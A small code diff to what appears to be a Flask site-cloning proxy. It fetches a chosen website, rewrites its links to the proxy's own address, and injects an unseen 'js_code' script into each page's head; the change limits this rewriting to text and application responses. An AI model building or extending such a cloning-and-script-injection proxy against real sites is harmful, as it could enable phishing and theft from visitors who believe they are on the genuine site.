@@ -15,7 +15,7 @@ visited_urls = []
 
 @app.route('/clone', methods=['GET', 'POST'])
 def clone_site():
-    global user_site
+    global user_site, visited_urls
     if request.method == 'POST':
         site = request.form.get('site', '')
         if site.startswith('www'):
@@ -41,16 +41,17 @@ Visited URLs:
 """
 
 def fetch_and_modify_content(url):
-    global user_site, visited_urls
     full_url = user_site + '/' + url
-   
     try:
         response = session.get(full_url)
         content_type = response.headers['Content-Type']
-        html_content = response.content.replace(user_site.encode('utf-8'), server_url.encode('utf-8'))
-        html_content = html_content.replace(b'</head>', js_code.encode('utf-8') + b'</head>', 1)
-         
-        return html_content, content_type
+
+        if content_type.startswith(('text', 'application')):
+            html_content = response.content.replace(user_site.encode('utf-8'), server_url.encode('utf-8'))
+            html_content = html_content.replace(b'</head>', js_code.encode('utf-8') + b'</head>', 1)
+            return html_content, content_type
+            
+        return response.content, content_type
     except Exception as e:
         return str(e), 'text/plain'
 
